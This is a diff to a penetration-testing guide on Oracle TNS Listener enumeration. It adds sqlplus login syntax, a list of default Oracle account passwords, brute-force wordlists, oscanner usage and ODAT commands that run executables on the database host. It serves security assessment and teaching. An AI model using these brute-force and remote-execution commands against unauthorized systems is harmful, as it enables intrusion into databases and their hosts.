@@ -1,5 +1,73 @@
 # Oracle TNS Listener - 1521,1522,1529
 
+## Oracle Information
+
+Oracle database \(Oracle DB\) is a relational database management system \(RDBMS\) from the Oracle Corporation \(from [here](https://www.techopedia.com/definition/8711/oracle-database)\).
+
+When enumerating Oracle, the first step is to contact the TNS-Listener, which is normally found on the default port \(1521/TCP; secondary listeners can be found on ports 1522–1529\).
+
+```text
+1521/tcp open  oracle-tns    Oracle TNS Listener 9.2.0.1.0 (for 32-bit Windows)
+1748/tcp open  oracle-tns    Oracle TNS Listener
+```
+
+## SQLPlus Authentication
+
+To login using known credentials:
+
+```text
+sqlplus <username>/<password>@<ip_address>/<SID>;
+```
+
+If the TNS Listener is on a non-default port \(e.g. TCP/1522\) :
+
+```text
+sqlplus <username>/<password>@<ip_address>:<port>/<SID>;
+```
+
+If an **account has system database privileges \(sysdba\) or system operator \(sysop\)** you may wish to try the following:
+
+```bash
+sqlplus <username>/<password>@<ip_address>/<SID> 'as sysdba';
+```
+
+## **SID Bruteforce**
+
+In order to use **oracle\_login** with **patator** you need to **install**:
+
+```text
+pip3 install cx_Oracle --upgrade
+```
+
+### **Default Passwords**
+
+Below are some of the default passwords associated with Oracle:
+
+* **DBSNMP/DBSNMP** — Intelligent Agent uses this to talk to the db server \(its some work to change it\)
+* **SYS/CHANGE\_ON\_INSTALL** — Default sysdba account before and including Oracle v9, as of version 10g this has to be different!
+* **PCMS\_SYS/PCMS\_SYS** — Default x account
+* **WMSYS/WMSYS** — Default x account
+* **OUTLN/OUTLN** — Default x account
+* **SCOTT/TIGER** — Default x account
+
+### User/Pass bruteforce
+
+Different tools offered **different user/pass lists** for oracle:
+
+* **oscan:** _/usr/share/oscanner/accounts.default_ \(169 lines\)
+* **MSF-1:**  _from_ admin/oracle/oracle\_login  __/usr/share/metasploit-framework/data/wordlists/oracle\_default\_passwords.csv \(598 lines\)
+* **MSF-2:** _from scanner/oracle/oracle\_login_  _/usr/share/metasploit-framework/data/wordlists/oracle\_default\_userpass.txt_ \(568 lines\)
+* **Nmap:** _/usr/share/nmap/nselib/data/oracle-default-accounts.lst_ \(687 lines\)
+
+## oscanner
+
+**Oscanner**, which will try to get some valid SID, and then it will brute-force for valid credentials and try to extract some information:
+
+```bash
+#apt install oscanner
+oscanner -s <IP> -P <PORT>
+```
+
 ## ODAT
 
 {% embed url="https://github.com/quentinhardy/odat" %}
@@ -60,6 +128,9 @@ python3 odat.py passwordguesser -s <IP> -d <SID> -U "username" -P "password" --p
 python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe
 # Use sysdba
 python3 odat.py externaltable -s <IP> -d <SID> -U "username" -P "password" --exec /Temp/shell.exe --sysdba
+# Alternatively
+./odat.py externaltable -s <IP> -U <username> -P <password> -d <SID> --exec "C:/windows/system32" "calc.exe"
+
 ```
 
 
